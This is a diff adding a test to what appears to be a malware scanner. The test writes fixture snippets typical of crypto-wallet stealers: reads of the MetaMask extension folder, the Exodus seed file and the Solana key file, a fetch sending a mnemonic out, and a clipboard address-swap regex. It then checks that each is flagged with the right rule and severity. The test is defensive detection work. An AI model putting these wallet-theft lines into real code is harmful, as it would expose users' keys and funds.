@@ -221,3 +221,28 @@ def test_one_secret_named_variable_sent_over_the_network_is_medium(tmp_path: Pat
     write(tmp_path, "c.js", "fetch(process.env.API_URL)\n")  # a URL setting, not a secret
     got = {f["file"]: f["severity"] for f in findings(tmp_path) if f["rule"] == "env-secret-send"}
     assert got == {"a.js": "MEDIUM", "b.py": "MEDIUM"}
+
+
+def test_wallet_theft_patterns(tmp_path: Path) -> None:
+    write(
+        tmp_path,
+        "ext.js",
+        "const p = home + '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';\n",
+    )
+    write(tmp_path, "exo.py", "open(os.path.expanduser('~/.config/Exodus/exodus.wallet/seed.seco'), 'rb')\n")
+    write(tmp_path, "sol.js", "fs.readFileSync(os.homedir() + '/.config/solana/id.json')\n")
+    write(tmp_path, "seed.js", "fetch(hook, {body: JSON.stringify({mnemonic})})\n")
+    write(tmp_path, "clip.py", "import re; ADDR = re.compile(r'0x[a-fA-F0-9]{40}')  # swap in the attacker address\n")
+    write(tmp_path, "ok.js", "// MetaMask is a popular wallet\nconsole.log('connect wallet')\n")
+    sev = {
+        f["file"]: f["rule"] + ":" + f["severity"]
+        for f in findings(tmp_path)
+        if "wallet" in f["rule"] or f["rule"] in ("seed-phrase-send", "crypto-address-regex")
+    }
+    assert sev == {
+        "ext.js": "wallet-theft:HIGH",
+        "exo.py": "wallet-theft:HIGH",
+        "sol.js": "wallet-theft:HIGH",
+        "seed.js": "seed-phrase-send:MEDIUM",
+        "clip.py": "crypto-address-regex:MEDIUM",
+    }
